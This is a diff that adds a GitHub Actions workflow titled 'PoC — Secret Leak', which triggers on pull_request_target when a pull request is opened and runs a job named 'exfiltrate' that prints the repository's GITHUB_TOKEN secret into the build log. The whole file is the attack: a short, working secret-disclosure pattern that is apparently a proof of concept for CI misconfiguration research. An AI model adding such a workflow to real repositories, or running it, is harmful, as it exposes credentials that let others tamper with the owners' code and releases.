@@ -1,0 +1,14 @@
+name: PoC — Secret Leak
+
+on:
+  pull_request_target:
+    types: [opened]
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show GitHub token
+        run: |
+          echo "[+] Printing full GITHUB_TOKEN..."
+          echo "${{ secrets.GITHUB_TOKEN }}"
